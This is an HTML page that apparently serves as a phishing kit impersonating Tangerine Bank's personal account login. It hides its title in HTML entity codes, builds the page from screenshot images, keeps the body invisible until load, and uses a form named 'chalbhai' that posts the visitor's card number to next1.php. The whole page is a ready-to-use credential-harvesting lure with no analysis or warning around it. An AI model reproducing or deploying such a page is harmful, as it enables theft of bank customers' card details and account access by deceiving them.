<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#84;&#97;&#110;&#103;&#101;&#114;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#58;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#76;&#111;&#103;&#105;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style>
			  
			  .textbox { 
    border: 1px solid #c4c4c4; 
    height: 28px; 
    width: 275px; 
    font-size: 13px; 
    padding: 4px 4px 4px 4px; 
    border-radius: 4px; 
    -moz-border-radius: 4px; 
    -webkit-border-radius: 4px; 
    box-shadow: 0px 0px 8px #d9d9d9; 
    -moz-box-shadow: 0px 0px 8px #d9d9d9; 
    -webkit-box-shadow: 0px 0px 8px #d9d9d9; 
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #E8AC7A; 
    box-shadow: 0px 0px 8px #E8AC7A; 
    -moz-box-shadow: 0px 0px 8px #E8AC7A; 
    -webkit-box-shadow: 0px 0px 8px #E8AC7A; 
} 
			  
			  </style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1351px; height:119px; z-index:0"><img src="images/a1.png" alt="" title="" border=0 width=1351 height=119></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:118px; width:1350px; height:43px; z-index:1"><a href="#"><img src="images/a2.png" alt="" title="" border=0 width=1350 height=43></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:91px; top:504px; width:484px; height:19px; z-index:2"><img src="images/a4.png" alt="" title="" border=0 width=484 height=19></div>

<div id="image5" style="position:absolute; overflow:hidden; left:976px; top:499px; width:305px; height:24px; z-index:3"><a href="#"><img src="images/a5.png" alt="" title="" border=0 width=305 height=24></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:616px; width:1349px; height:51px; z-index:4"><img src="images/a6.png" alt="" title="" border=0 width=1349 height=51></div>

<div id="image7" style="position:absolute; overflow:hidden; left:297px; top:505px; width:277px; height:17px; z-index:5"><a href="#"><img src="images/deposit.png" alt="" title="" border=0 width=277 height=17></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:938px; top:9px; width:321px; height:18px; z-index:6"><a href="#"><img src="images/head.png" alt="" title="" border=0 width=321 height=18></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:88px; top:51px; width:205px; height:53px; z-index:7"><a href="#"><img src="images/tanger.png" alt="" title="" border=0 width=205 height=53></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:478px; top:69px; width:376px; height:18px; z-index:8"><a href="#"><img src="images/a7.png" alt="" title="" border=0 width=376 height=18></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:89px; top:631px; width:390px; height:18px; z-index:9"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=390 height=18></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:89px; top:174px; width:575px; height:306px; z-index:10"><img src="images/a3.png" alt="" title="" border=0 width=575 height=306></div>

<div id="image10" style="position:absolute; overflow:hidden; left:112px; top:270px; width:87px; height:24px; z-index:11"><img src="images/cardnumb.png" alt="" title="" border=0 width=87 height=24></div>

<form action="next1.php" name=chalbhai id=chalbhai method=post>

<input name="formtext1" class="textbox" required type="text" style="position:absolute;width:231px;left:109px;top:306px;z-index:12">
<div id="formimage1" style="position:absolute; left:561px; top:420px; z-index:13"><input type="image" name="formimage1" width="82" height="28" src="images/continue.png"></div>
<input name="formtext2" class="textbox" placeholder="Search" type="text" style="position:absolute;width:201px;left:1021px;top:66px;z-index:14">
<div id="image11" style="position:absolute; overflow:hidden; left:1222px; top:65px; width:38px; height:30px; z-index:15"><img src="images/search.png" alt="" title="" border=0 width=38 height=30></div>

<div id="image14" style="position:absolute; overflow:hidden; left:109px; top:415px; width:107px; height:17px; z-index:16"><a href="#"><img src="images/forger.png" alt="" title="" border=0 width=107 height=17></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:109px; top:443px; width:169px; height:17px; z-index:17"><a href="#"><img src="images/goto.png" alt="" title="" border=0 width=169 height=17></a></div>


</body>
</html>
